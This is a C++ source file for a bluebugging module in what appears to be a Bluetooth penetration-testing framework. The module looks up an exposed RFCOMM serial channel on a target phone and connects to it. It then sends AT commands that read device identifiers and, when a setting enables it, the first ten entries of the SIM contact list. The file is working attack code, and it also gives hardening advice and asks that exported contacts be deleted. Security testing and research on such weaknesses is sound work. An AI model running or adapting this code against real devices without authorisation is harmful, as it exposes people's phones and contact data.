#include "core/bt.h"
#include "core/config.h"
#include "core/module.h"

#include <sstream>
#include <unistd.h>

namespace {
using namespace blueboy;

std::string tidy(std::string s) {
  for (char &c : s) {
    if (c == '\r' || c == '\n')
      c = ' ';
  }
  while (!s.empty() && s.back() == ' ')
    s.pop_back();
  if (s.size() > 200)
    s = s.substr(0, 200) + "...";
  return s;
}

/// Bluebugging: reach the peer's AT command interpreter through an exposed
/// Serial Port profile channel and read device information. Contact reading is
/// opt-in through [bluebug] read_contacts.
class Bluebug : public Module {
public:
  std::string name() const override { return "bluebug"; }
  std::string category() const override { return "offensive"; }
  std::string description() const override {
    return "AT command access over an exposed RFCOMM serial channel";
  }
  std::string requirements() const override {
    return "exposed SPP channel, root or CAP_NET_RAW, lab authorisation";
  }
  bool offensive() const override { return true; }
  std::string impact() const override {
    return "Sends AT commands to the peer's modem/phone. Can read identifiers, "
           "and with read_contacts enabled, the SIM/phone contact list.";
  }

  ModuleResult run(const ModuleContext &ctx) override {
    ModuleResult r;

    int channel = ctx.config->get_int("bluebug", "channel", 0);
    if (channel == 0) {
      std::string err;
      for (const auto &svc : bt::sdp_services(ctx.target, err)) {
        if (svc.rfcomm_channel > 0) {
          channel = svc.rfcomm_channel;
          r.add("SDP advertised RFCOMM channel " + std::to_string(channel) +
                " (" + (svc.name.empty() ? "unnamed service" : svc.name) + ")");
          break;
        }
      }
      if (channel == 0) {
        r.summary = "No RFCOMM serial channel found on " + ctx.target;
        r.add(err.empty() ? "SDP returned no channel" : err);
        r.advise("Bluebugging needs an exposed Serial Port profile; most "
                 "modern phones no longer expose one");
        return r;
      }
    }

    int sock = -1;
    if (!bt::rfcomm_connect(ctx.target, channel,
                            ctx.config->get_int("bluebug", "timeout_ms", 8000),
                            sock)) {
      r.summary = "Could not open RFCOMM channel " + std::to_string(channel);
      r.add("Connect failed or timed out; the channel may need authentication");
      r.advise("A channel that requires pairing is not bluebuggable without "
               "valid link keys");
      return r;
    }

    r.success = true;
    r.summary = "RFCOMM channel " + std::to_string(channel) + " answered AT";

    const char *probes[] = {"AT\r\n", "ATI\r\n", "AT+CGMI\r\n", "AT+CGMM\r\n"};
    for (const char *p : probes) {
      if (!bt::rfcomm_send(sock, p))
        break;
      const std::string reply = tidy(bt::rfcomm_read(sock, 1500));
      r.add(std::string("> ") + tidy(p) + "  =>  " +
            (reply.empty() ? "(no answer)" : reply));
    }

    if (ctx.config->get_bool("bluebug", "read_contacts", false)) {
      bt::rfcomm_send(sock, "AT+CPBS=\"SM\"\r\n");
      bt::rfcomm_read(sock, 1500);
      bt::rfcomm_send(sock, "AT+CPBR=1,10\r\n");
      const std::string book = bt::rfcomm_read(sock, 3000);
      r.add("Contact query (first 10 entries): " +
            (book.empty() ? std::string("(no answer)") : tidy(book)));
      r.advise("Delete the exported entries from your report unless the RoE "
               "explicitly requires them");
    } else {
      r.add("Contact read disabled ([bluebug] read_contacts = false)");
    }

    ::close(sock);

    r.advise("Disable Serial Port profile on devices that do not need it");
    r.advise("Require authentication and encryption on every RFCOMM service");
    r.advise("An AT prompt on a production device is a finding on its own: "
             "report it even when no data is read");
    return r;
  }
};

REGISTER_MODULE(Bluebug);
} // namespace
